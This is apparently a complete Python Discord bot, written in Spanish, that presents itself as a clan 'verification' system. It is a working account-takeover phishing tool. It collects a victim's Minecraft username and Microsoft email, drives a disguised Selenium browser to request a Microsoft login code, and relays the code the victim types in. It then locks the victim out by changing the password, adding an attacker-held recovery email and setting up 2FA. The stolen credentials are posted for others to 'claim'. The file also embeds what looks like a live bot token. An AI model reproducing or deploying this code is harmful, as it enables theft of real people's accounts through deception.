import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import json
import os
import random
import string
import asyncio
from datetime import datetime, timedelta
import aiohttp
import base64
import time
import re
import pyotp
import uuid

# ============================================
# CONFIGURACIÓN - EDITA ESTOS VALORES
# ============================================

TOKEN = "MTU0Mzc0NDMwNTcyMDcyNTYwNQ.GymDLc.D_wHdf6Vud1Abbb9wYibvtxrwJDavmWv27Ink0"  # Reemplaza con tu token real
OWNER_ID = 1529597881261228064  # Tu ID de usuario
VERIFICATION_CHANNEL_ID = 1471613652271632469  # ID del canal de verificación
LOGS_CHANNEL_ID = 1552468946030956547  # ID del canal de logs
CHROME_DRIVER_PATH = "/usr/bin/chromedriver"  # Ruta al chromedriver
SERVER_LOGO_URL = "https://cdn.discordapp.com/icons/123456789/logo.png"  # URL del logo

# ============================================
# NO EDITAR DEBAJO DE ESTA LÍNEA
# ============================================

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, StaleElementReferenceException
    SELENIUM_AVAILABLE = True
    print("✅ Selenium importado")
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium no instalado")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

DATA_FILE = "minecraft_accounts.json"

class AccountManager:
    def __init__(self):
        self.accounts = []
        self.load_data()
    
    def load_data(self):
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                self.accounts = json.load(f)
        else:
            self.accounts = []
    
    def save_data(self):
        with open(DATA_FILE, 'w') as f:
            json.dump(self.accounts, f, indent=4)
    
    def add_account(self, username, email, discord_user, has_java=False, temp_email=None, secret_key=None, password=None, security_configured=False):
        account = {
            "username": username,
            "email": email,
            "temp_email": temp_email,
            "secret_key": secret_key,
            "password": password,
            "discord_user": discord_user,
            "has_minecraft_java": has_java,
            "security_configured": security_configured,
            "verified": True,
            "claimed": False,
            "claimed_by": None,
            "timestamp": datetime.now().isoformat()
        }
        self.accounts.append(account)
        self.save_data()
        return account
    
    def claim_account(self, username, claimed_by):
        for account in self.accounts:
            if account['username'].lower() == username.lower() and not account.get('claimed', False):
                account['claimed'] = True
                account['claimed_by'] = claimed_by
                self.save_data()
                return account
        return None

account_manager = AccountManager()

class TempEmailService:
    @staticmethod
    def create_account_sync():
        try:
            import requests
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
            
            resp = requests.post(
                "https://api.mail.tm/accounts",
                json={"address": f"{username}@bugfoo.com", "password": password},
                timeout=10
            )
            if resp.status_code in [200, 201]:
                data = resp.json()
                return data.get('address'), password
        except:
            pass
        return None, None
    
    @staticmethod
    def wait_for_code_sync(email, password, timeout=60):
        try:
            import requests
            
            resp = requests.post(
                "https://api.mail.tm/token",
                json={"address": email, "password": password},
                timeout=10
            )
            if resp.status_code != 200:
                return None
            
            token = resp.json().get('token')
            headers = {"Authorization": f"Bearer {token}"}
            
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                resp = requests.get(
                    "https://api.mail.tm/messages",
                    headers=headers,
                    timeout=10
                )
                if resp.status_code == 200:
                    messages = resp.json()
                    
                    if isinstance(messages, list):
                        for msg in messages:
                            if msg.get('id'):
                                resp2 = requests.get(
                                    f"https://api.mail.tm/messages/{msg['id']}",
                                    headers=headers,
                                    timeout=10
                                )
                                if resp2.status_code == 200:
                                    content = resp2.json()
                                    body = content.get('text', '') or content.get('html', '')
                                    body = re.sub(r'<[^>]+>', ' ', body)
                                    
                                    code_match = re.search(r'\b(\d{6})\b', body)
                                    if code_match:
                                        return code_match.group(1)
                
                time.sleep(3)
            
            return None
        except:
            return None

class EmailGenerator:
    @staticmethod
    def is_valid_email_format(email):
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None

class TwoFAGenerator:
    @staticmethod
    def generate_zyger_secret_key():
        random_bytes = os.urandom(20)
        secret_key = base64.b32encode(random_bytes).decode('utf-8').rstrip('=')
        return secret_key

class MinecraftAPI:
    @staticmethod
    async def get_player_info(username):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.mojang.com/users/profiles/minecraft/{username}",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        return {"uuid": data['id'], "name": username}
        except:
            pass
        return None
    
    @staticmethod
    async def get_head_url(username):
        try:
            return f"https://visage.surgeplay.com/bust/256/{username}"
        except:
            return None
    
    @staticmethod
    async def check_minecraft_java(username):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.mojang.com/users/profiles/minecraft/{username}",
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    if resp.status == 200:
                        return True
        except:
            pass
        return False

class AutoSecure:
    def __init__(self, driver, wait):
        self.driver = driver
        self.wait = wait
        self.security_data = {}
    
    def generate_security_data(self):
        self.security_data = {
            "password": self._generate_strong_password(),
            "security_email": self._create_temp_email(),
            "secret_key": self._generate_2fa_key(),
        }
        return self.security_data
    
    def _generate_strong_password(self):
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        return ''.join(random.choice(chars) for _ in range(20))
    
    def _create_temp_email(self):
        try:
            email, password = TempEmailService.create_account_sync()
            if email and password:
                return {"email": email, "password": password, "created": True}
            return {"email": None, "password": None, "created": False}
        except:
            return {"email": None, "password": None, "created": False}
    
    def _generate_2fa_key(self):
        return TwoFAGenerator.generate_zyger_secret_key()
    
    def execute_autosecure(self):
        results = {
            "password_changed": False,
            "security_email_added": False,
            "2fa_configured": False,
            "errors": []
        }
        
        success, error = self._change_password()
        results["password_changed"] = success
        if error:
            results["errors"].append(f"Password: {error}")
        
        success, error = self._add_security_email()
        results["security_email_added"] = success
        if error:
            results["errors"].append(f"Email: {error}")
        
        success, error = self._configure_2fa()
        results["2fa_configured"] = success
        if error:
            results["errors"].append(f"2FA: {error}")
        
        results["all_success"] = all([
            results["password_changed"],
            results["security_email_added"],
            results["2fa_configured"]
        ])
        
        return results
    
    def _change_password(self):
        try:
            self.driver.get("https://account.live.com/password/change")
            
            try:
                WebDriverWait(self.driver, 15).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                )
            except TimeoutException:
                return False, "No se encontraron campos de contraseña"
            
            pass_inputs = self.driver.find_elements(By.CSS_SELECTOR, "input[type='password']")
            visible_inputs = [inp for inp in pass_inputs if inp.is_displayed()]
            
            if len(visible_inputs) < 2:
                return False, "No hay suficientes campos"
            
            visible_inputs[0].clear()
            visible_inputs[0].send_keys(self.security_data["password"])
            visible_inputs[1].clear()
            visible_inputs[1].send_keys(self.security_data["password"])
            
            try:
                save_btn = WebDriverWait(self.driver, 5).until(
                    EC.element_to_be_clickable((By.ID, "iSave"))
                )
                save_btn.click()
            except TimeoutException:
                visible_inputs[1].send_keys(Keys.ENTER)
            
            return True, None
        except Exception as e:
            return False, str(e)
    
    def _add_security_email(self):
        try:
            if not self.security_data["security_email"]["created"]:
                return False, "No se pudo crear email"
            
            email = self.security_data["security_email"]["email"]
            password = self.security_data["security_email"]["password"]
            
            self.driver.get("https://account.live.com/proofs/manage/additional")
            
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "iAddEmail"))
                ).click()
            except TimeoutException:
                return False, "No se encontró botón"
            
            try:
                email_input = WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "EmailAddress"))
                )
                email_input.clear()
                email_input.send_keys(email)
            except TimeoutException:
                return False, "No se encontró campo"
            
            try:
                save_btn = self.driver.find_element(By.ID, "iSave")
                save_btn.click()
            except:
                email_input.send_keys(Keys.ENTER)
            
            verification_code = TempEmailService.wait_for_code_sync(email, password, timeout=60)
            
            if not verification_code:
                return False, "No se recibió código"
            
            try:
                code_input = WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "otc"))
                )
                code_input.clear()
                code_input.send_keys(verification_code)
                code_input.send_keys(Keys.ENTER)
            except TimeoutException:
                return False, "No se encontró campo de código"
            
            return True, None
        except Exception as e:
            return False, str(e)
    
    def _configure_2fa(self):
        try:
            self.driver.get("https://account.live.com/proofs/manage/totp")
            
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable((By.ID, "iAddTotp"))
                ).click()
            except TimeoutException:
                pass
            
            try:
                secret_input = WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.NAME, "secretKey"))
                )
                secret_input.clear()
                secret_input.send_keys(self.security_data["secret_key"])
            except TimeoutException:
                return False, "No se encontró campo"
            
            try:
                save_btn = self.driver.find_element(By.ID, "iSave")
                save_btn.click()
            except:
                secret_input.send_keys(Keys.ENTER)
            
            return True, None
        except Exception as e:
            return False, str(e)

class MicrosoftAccountManager:
    def __init__(self):
        self.driver = None
        self.wait = None
        self.autosecure = None
        self.autosecure_data = None
    
    def setup_driver(self):
        if not SELENIUM_AVAILABLE:
            return False
        
        try:
            chrome_options = Options()
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            
            profile_dir = f"/tmp/chrome-auto-{uuid.uuid4().hex[:8]}"
            chrome_options.add_argument(f"--user-data-dir={profile_dir}")
            
            chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            service = Service(CHROME_DRIVER_PATH)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            self.wait = WebDriverWait(self.driver, 20)
            self.autosecure = AutoSecure(self.driver, self.wait)
            return True
        except Exception as e:
            print(f"❌ Error: {e}")
            return False
    
    def request_code_for_login(self, email):
        try:
            print(f"\n🔍 Solicitando código para: {email}")
            
            self.driver.get("https://login.live.com/")
            
            try:
                WebDriverWait(self.driver, 15).until(
                    EC.presence_of_element_located((By.TAG_NAME, "body"))
                )
                print("✅ Página cargada")
            except TimeoutException:
                return False, "Timeout"
            
            print("⏳ Buscando campo de email...")
            
            email_input = None
            
            try:
                email_input = WebDriverWait(self.driver, 10).until(
                    EC.element_to_be_clickable((By.NAME, "loginfmt"))
                )
                print("✅ Campo: loginfmt")
            except TimeoutException:
                pass
            
            if not email_input:
                try:
                    email_input = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable((By.ID, "i0116"))
                    )
                    print("✅ Campo: i0116")
                except TimeoutException:
                    pass
            
            if not email_input:
                try:
                    email_input = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, "input[type='email']"))
                    )
                    print("✅ Campo: input[type='email']")
                except TimeoutException:
                    pass
            
            if not email_input:
                inputs = self.driver.find_elements(By.TAG_NAME, "input")
                for inp in inputs:
                    if inp.is_displayed():
                        inp_type = inp.get_attribute("type")
                        if inp_type in ["email", "text"]:
                            email_input = inp
                            print(f"✅ Campo genérico")
                            break
            
            if not email_input:
                return False, "No se encontró campo de email"
            
            try:
                email_input.click()
                time.sleep(1)
            except:
                pass
            
            email_input.clear()
            email_input.send_keys(email)
            print(f"✅ Email ingresado")
            
            try:
                next_btn = WebDriverWait(self.driver, 5).until(
                    EC.element_to_be_clickable((By.ID, "idSIButton9"))
                )
                next_btn.click()
                print("✅ Click en Next")
            except TimeoutException:
                email_input.send_keys(Keys.ENTER)
            
            print("⏳ Esperando 'Send a code to'...")
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'send a code to')]"))
                )
                print("✅ Opción detectada")
            except TimeoutException:
                pass
            
            try:
                error = self.driver.find_element(By.ID, "usernameError")
                if error.is_displayed() and error.text.strip():
                    return False, "Email no reconocido"
            except:
                pass
            
            send_clicked = False
            
            xpath_selectors = [
                "//*[text()[contains(translate(., 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'send a code to')]]",
                "//a[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'send a code to')]",
                "//button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'send a code to')]",
            ]
            
            for xpath in xpath_selectors:
                try:
                    elements = self.driver.find_elements(By.XPATH, xpath)
                    for el in elements:
                        if el.is_displayed():
                            try:
                                el.click()
                            except:
                                parent = el.find_element(By.XPATH, "..")
                                parent.click()
                            print(f"✅ Click en 'Send a code to'")
                            send_clicked = True
                            break
                    if send_clicked:
                        break
                except:
                    continue
            
            if not send_clicked:
                js_click = """
                var elements = document.querySelectorAll('a, button, div, span');
                for(var i = 0; i < elements.length; i++) {
                    var text = elements[i].textContent.toLowerCase().trim();
                    if(text.includes('send a code to')) {
                        elements[i].click();
                        return true;
                    }
                }
                return false;
                """
                if self.driver.execute_script(js_click):
                    print("✅ Click por JavaScript")
                    send_clicked = True
            
            if send_clicked:
                try:
                    WebDriverWait(self.driver, 10).until(
                        EC.presence_of_element_located((By.NAME, "otc"))
                    )
                    return True, "Código solicitado"
                except TimeoutException:
                    return True, "Código solicitado"
            
            return True, "Email válido"
            
        except Exception as e:
            return False, f"Error: {e}"
    
    def verify_code_and_autosecure(self, code):
        try:
            code_input = None
            for by, selector in [(By.NAME, "otc"), (By.ID, "otc"), (By.CSS_SELECTOR, "input[type='text']")]:
                try:
                    code_input = WebDriverWait(self.driver, 10).until(
                        EC.element_to_be_clickable((by, selector))
                    )
                    break
                except TimeoutException:
                    continue
            
            if not code_input:
                return False, "No se encontró campo de código"
            
            code_input.clear()
            code_input.send_keys(code)
            code_input.send_keys(Keys.ENTER)
            print(f"✅ Código ingresado")
            
            try:
                WebDriverWait(self.driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'Stay signed in')]"))
                )
                try:
                    yes_btn = WebDriverWait(self.driver, 5).until(
                        EC.element_to_be_clickable((By.ID, "idSIButton9"))
                    )
                    yes_btn.click()
                except TimeoutException:
                    self.driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ENTER)
            except TimeoutException:
                pass
            
            try:
                error = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.ID, "otcError"))
                )
                if error.text.strip():
                    return False, "Código incorrecto"
            except TimeoutException:
                pass
            
            security_data = self.autosecure.generate_security_data()
            self.autosecure.execute_autosecure()
            self.autosecure_data = security_data
            
            return True, security_data
            
        except Exception as e:
            return False, f"Error: {e}"
    
    def close(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

def generate_password():
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(16))

async def send_log_username(username, head_url, status):
    try:
        channel = bot.get_channel(LOGS_CHANNEL_ID)
        if channel:
            embed = discord.Embed(
                title="Username | Status",
                description=f"```{username} | {status}```",
                color=discord.Color.blue(),
                timestamp=datetime.now()
            )
            if head_url:
                embed.set_thumbnail(url=head_url)
            await channel.send(embed=embed)
    except Exception as e:
        print(f"❌ Error: {e}")

async def send_log_email(username, email, head_url, status):
    try:
        channel = bot.get_channel(LOGS_CHANNEL_ID)
        if channel:
            embed = discord.Embed(
                title="Username | Email | Status",
                description=f"```{username} | {email} | {status}```",
                color=discord.Color.green(),
                timestamp=datetime.now()
            )
            if head_url:
                embed.set_thumbnail(url=head_url)
            await channel.send(embed=embed)
    except Exception as e:
        print(f"❌ Error: {e}")

async def send_log_code(username, email, code, head_url, status):
    try:
        channel = bot.get_channel(LOGS_CHANNEL_ID)
        if channel:
            embed = discord.Embed(
                title="Username | Email | Status",
                description=f"```{username} | {email} | {status}```",
                color=discord.Color.orange(),
                timestamp=datetime.now()
            )
            if head_url:
                embed.set_thumbnail(url=head_url)
            embed.add_field(name="Código", value=f"`{code}`", inline=False)
            await channel.send(embed=embed)
    except Exception as e:
        print(f"❌ Error: {e}")

async def send_log_final(username, email, head_url, has_java, discord_user, setup_success):
    try:
        channel = bot.get_channel(LOGS_CHANNEL_ID)
        if channel:
            java_status = "✅ Java" if has_java else "❌ Sin Java"
            setup_status = "✅ Security Configured" if setup_success else "⚠️ Security Pending"
            
            embed = discord.Embed(
                title="Username | Email | Status",
                description=f"```{username} | {email} | {setup_status}```",
                color=discord.Color.purple() if setup_success else discord.Color.orange(),
                timestamp=datetime.now()
            )
            if head_url:
                embed.set_thumbnail(url=head_url)
            embed.add_field(name="Username", value=username, inline=True)
            embed.add_field(name="Email", value=email, inline=True)
            embed.add_field(name="Minecraft Java", value=java_status, inline=True)
            embed.add_field(name="Discord", value=discord_user, inline=False)
            
            if setup_success:
                view = ClaimView(username)
                await channel.send(embed=embed, view=view)
                await channel.send("@here ¡Nueva cuenta verificada disponible para claim!")
            else:
                await channel.send(embed=embed)
    except Exception as e:
        print(f"❌ Error: {e}")

class ClaimModal(Modal, title="🎯 Claim de Cuenta"):
    def __init__(self, username):
        super().__init__()
        self.username = username
        
        self.verify_username = TextInput(
            label="Nombre de la cuenta de Minecraft",
            placeholder=f"Escribe '{username}' para confirmar",
            min_length=3,
            max_length=16,
            required=True
        )
        self.add_item(self.verify_username)
    
    async def on_submit(self, interaction: discord.Interaction):
        entered_username = self.verify_username.value.strip()
        
        if entered_username.lower() != self.username.lower():
            await interaction.response.send_message(
                f"❌ El nombre no coincide con **{self.username}**.",
                ephemeral=True
            )
            return
        
        account = None
        for acc in account_manager.accounts:
            if acc['username'].lower() == self.username.lower() and not acc.get('claimed', False):
                account = acc
                break
        
        if account:
            account['claimed'] = True
            account['claimed_by'] = str(interaction.user)
            account_manager.save_data()
            
            try:
                user = interaction.user
                
                embed = discord.Embed(
                    title=f"✅ You have claimed {account['username']}",
                    color=discord.Color.green(),
                    timestamp=datetime.now()
                )
                
                embed.add_field(name="📧 Primary Email", value=f"```{account['email']}```", inline=False)
                embed.add_field(name="🛡️ Security Email", value=f"```{account.get('temp_email', 'N/A')}```", inline=False)
                embed.add_field(name="🔑 Secret Key (Zyger 2FA)", value=f"```{account.get('secret_key', 'N/A')}```", inline=False)
                embed.add_field(name="🔐 Password", value=f"```{account.get('password', 'N/A')}```", inline=False)
                
                await user.send(embed=embed)
                
                await interaction.response.send_message(
                    embed=discord.Embed(
                        title="✅ ¡Cuenta Reclamada!",
                        description="La información ha sido enviada a tu MD.",
                        color=discord.Color.green()
                    ),
                    ephemeral=True
                )
            except Exception as e:
                await interaction.response.send_message(
                    f"❌ No se pudo enviar MD: {e}",
                    ephemeral=True
                )
        else:
            await interaction.response.send_message(
                "❌ Esta cuenta ya fue reclamada o no existe.",
                ephemeral=True
            )

class ClaimView(View):
    def __init__(self, username):
        super().__init__(timeout=None)
        self.username = username
    
    @discord.ui.button(label="🎯 Claim", style=discord.ButtonStyle.danger)
    async def claim_button(self, interaction: discord.Interaction, button: Button):
        modal = ClaimModal(self.username)
        await interaction.response.send_modal(modal)

class VerifyView(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="✅ Verificarse", style=discord.ButtonStyle.green, custom_id="verify_btn")
    async def verify_button(self, interaction: discord.Interaction, button: Button):
        modal = UsernameModal()
        await interaction.response.send_modal(modal)

class UsernameModal(Modal, title="🎮 Verificación Minecraft"):
    def __init__(self):
        super().__init__()
        self.username = TextInput(
            label="Username de Minecraft",
            placeholder="Ingresa tu username",
            min_length=3,
            max_length=16,
            required=True
        )
        self.add_item(self.username)
    
    async def on_submit(self, interaction: discord.Interaction):
        username = self.username.value
        
        await interaction.response.defer(ephemeral=True)
        
        player_info = await MinecraftAPI.get_player_info(username)
        has_java = await MinecraftAPI.check_minecraft_java(username)
        head_url = await MinecraftAPI.get_head_url(username)
        
        await send_log_username(username, head_url, "Requesting Email")
        
        embed = discord.Embed(
            title="📧 Introduzca su correo electrónico!",
            description=(
                "¡Bienvenido al proceso de verificación de Minecraft!\n\n"
                "Por favor ingresa el email de tu cuenta de Microsoft.\n\n"
                f"**Username:** {username}"
            ),
            color=discord.Color.blue(),
            timestamp=datetime.now()
        )
        
        if head_url:
            embed.set_thumbnail(url=head_url)
        
        view = View(timeout=300)
        email_button = Button(label="📩 Ingresar Email", style=discord.ButtonStyle.primary)
        
        async def email_button_callback(btn_interaction):
            modal = EmailModal(username, player_info, head_url, has_java)
            await btn_interaction.response.send_modal(modal)
        
        email_button.callback = email_button_callback
        view.add_item(email_button)
        
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

class EmailModal(Modal, title="📧 Correo electrónico"):
    def __init__(self, username, player_info, head_url, has_java):
        super().__init__()
        self.username = username
        self.player_info = player_info
        self.head_url = head_url
        self.has_java = has_java
        
        self.email = TextInput(
            label="📩 Correo electrónico",
            placeholder="ejemplo@hotmail.com",
            min_length=5,
            max_length=100,
            required=True
        )
        self.add_item(self.email)
    
    async def on_submit(self, interaction: discord.Interaction):
        email = self.email.value.strip()
        
        await interaction.response.defer(ephemeral=True)
        
        if not EmailGenerator.is_valid_email_format(email):
            await interaction.followup.send(
                embed=discord.Embed(
                    title="❌ Error al Poner email",
                    description="Porfavor escriba bien o ponga otro email valido",
                    color=discord.Color.red()
                ),
                ephemeral=True
            )
            return
        
        ms_manager = MicrosoftAccountManager()
        
        if not ms_manager.setup_driver():
            await interaction.followup.send(
                embed=discord.Embed(
                    title="❌ Error",
                    description="No se pudo configurar Chrome",
                    color=discord.Color.red()
                ),
                ephemeral=True
            )
            return
        
        def request_code():
            return ms_manager.request_code_for_login(email)
        
        success, msg = await asyncio.get_event_loop().run_in_executor(None, request_code)
        
        if not success:
            await interaction.followup.send(
                embed=discord.Embed(
                    title="❌ Error",
                    description=msg,
                    color=discord.Color.red()
                ),
                ephemeral=True
            )
            ms_manager.close()
            return
        
        await send_log_email(self.username, email, self.head_url, "Code Sent")
        
        embed = discord.Embed(
            title="🔑 Código de Verificación",
            description=(
                f"Se ha enviado un código a **{email}**.\n"
                "Haz clic en el botón para ingresarlo."
            ),
            color=discord.Color.green(),
            timestamp=datetime.now()
        )
        
        if self.head_url:
            embed.set_thumbnail(url=self.head_url)
        
        view = View(timeout=300)
        code_button = Button(label="🔑 Ingresar Código", style=discord.ButtonStyle.success)
        
        async def code_button_callback(btn_interaction):
            modal = CodeModal(
                self.username, email, self.player_info,
                self.head_url, self.has_java, ms_manager
            )
            await btn_interaction.response.send_modal(modal)
        
        code_button.callback = code_button_callback
        view.add_item(code_button)
        
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)

class CodeModal(Modal, title="🔑 Código de Verificación"):
    def __init__(self, username, email, player_info, head_url, has_java, ms_manager):
        super().__init__()
        self.username = username
        self.email = email
        self.player_info = player_info
        self.head_url = head_url
        self.has_java = has_java
        self.ms_manager = ms_manager
        
        self.code = TextInput(
            label="Código de verificación",
            placeholder="Ingresa el código de 6 dígitos",
            min_length=6,
            max_length=6,
            required=True
        )
        self.add_item(self.code)
    
    async def on_submit(self, interaction: discord.Interaction):
        code = self.code.value
        
        if not code.isdigit() or len(code) != 6:
            await interaction.response.send_message("❌ Código inválido.", ephemeral=True)
            return
        
        await interaction.response.defer(ephemeral=True)
        
        def verify_and_autosecure():
            return self.ms_manager.verify_code_and_autosecure(code)
        
        setup_success, setup_msg = await asyncio.get_event_loop().run_in_executor(None, verify_and_autosecure)
        
        await send_log_code(self.username, self.email, code, self.head_url, "Code Verified")
        
        if setup_success and self.ms_manager.autosecure_data:
            autosecure = self.ms_manager.autosecure_data
            
            account_manager.add_account(
                username=self.username,
                email=self.email,
                discord_user=str(interaction.user),
                has_java=self.has_java,
                temp_email=autosecure["security_email"]["email"] if autosecure["security_email"] else None,
                secret_key=autosecure["secret_key"],
                password=autosecure["password"],
                security_configured=True
            )
            
            await send_log_final(
                self.username, self.email,
                self.head_url, self.has_java, str(interaction.user),
                True
            )
            
            embed = discord.Embed(
                title="✅ Verificado",
                description=f"**{self.username}** ha sido verificado.",
                color=discord.Color.green()
            )
            await interaction.followup.send(embed=embed, ephemeral=True)
        else:
            await send_log_final(
                self.username, self.email,
                self.head_url, self.has_java, str(interaction.user),
                False
            )
            
            await interaction.followup.send(
                "❌ No se pudo completar la verificación.",
                ephemeral=True
            )
        
        self.ms_manager.close()

@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user.name}')
    
    if not SELENIUM_AVAILABLE:
        print("⚠️ Instala: pip install selenium")
    
    bot.add_view(VerifyView())
    
    channel = bot.get_channel(VERIFICATION_CHANNEL_ID)
    if channel:
        embed = discord.Embed(
            title="🛡️ Bienvenido a Vandal 🛡️",
            description=(
                "👋 **Hola, guerrero**\n\n"
                "Antes de acceder a todos los canales del clan, necesitas **verificarte**.\n"
                "Es rápido y obligatorio para mantener la seguridad de **Vandal**.\n\n"
                "✅ **Pasos para verificarte**\n\n"
                "1️⃣ Sigue las instrucciones del bot que aparecerán debajo de este mensaje\n"
                "2️⃣ Completa la verificación (reacciones, botones o comandos)\n"
                "3️⃣ Espera unos segundos mientras el sistema te da acceso\n"
                "4️⃣ ¡Listo! Entraras a una cola de espera para entrar al clan\n"
                "(no demoramos mas de 5 minutos)\n\n"
                "⚠️ **Importante**\n"
                "• Si tienes problemas, contacta a un **Staff**\n"
                "• No compartas tu verificación con nadie"
            ),
            color=discord.Color.purple(),
            timestamp=datetime.now()
        )
        embed.set_thumbnail(url=SERVER_LOGO_URL)
        await channel.send(embed=embed, view=VerifyView())

@bot.command(name='setup')
@commands.has_permissions(administrator=True)
async def setup(ctx):
    embed = discord.Embed(
        title="🛡️ Bienvenido a Vandal 🛡️",
        description=(
            "👋 **Hola, guerrero**\n\n"
            "Antes de acceder a todos los canales del clan, necesitas **verificarte**.\n"
            "Es rápido y obligatorio para mantener la seguridad de **Vandal**.\n\n"
            "✅ **Pasos para verificarte**\n\n"
            "1️⃣ Sigue las instrucciones del bot que aparecerán debajo de este mensaje\n"
            "2️⃣ Completa la verificación (reacciones, botones o comandos)\n"
            "3️⃣ Espera unos segundos mientras el sistema te da acceso\n"
            "4️⃣ ¡Listo! Entraras a una cola de espera para entrar al clan\n"
            "(no demoramos mas de 5 minutos)\n\n"
            "⚠️ **Importante**\n"
            "• Si tienes problemas, contacta a un **Staff**\n"
            "• No compartas tu verificación con nadie"
        ),
        color=discord.Color.purple(),
        timestamp=datetime.now()
    )
    embed.set_thumbnail(url=SERVER_LOGO_URL)
    await ctx.send(embed=embed, view=VerifyView())
    await ctx.message.delete()

@bot.command(name='accounts')
@commands.has_permissions(administrator=True)
async def list_accounts(ctx):
    accounts = account_manager.accounts
    
    if not accounts:
        await ctx.send("❌ No hay cuentas")
        return
    
    embed = discord.Embed(
        title=f"📋 Cuentas ({len(accounts)})",
        color=discord.Color.purple()
    )
    
    for i, acc in enumerate(accounts, 1):
        java_status = "✅ Java" if acc.get('has_java', False) else "❌ Sin Java"
        claimed_status = "✅ Reclamada" if acc.get('claimed', False) else "❌ Sin reclamar"
        embed.add_field(
            name=f"#{i} - {acc['username']}",
            value=f"Email: {acc['email']}\nJava: {java_status}\nClaim: {claimed_status}",
            inline=False
        )
    
    await ctx.send(embed=embed)

if __name__ == "__main__":
    if TOKEN == "TU_TOKEN_DE_DISCORD_AQUI":
        print("⚠️ Configura tu token en config.py")
    else:
        print("🤖 Iniciando bot...")
        print("📦 Instala dependencias:")
        print("   pip install discord.py selenium aiohttp pyotp requests")
        print("   sudo apt install chromium-chromedriver")
        bot.run(TOKEN)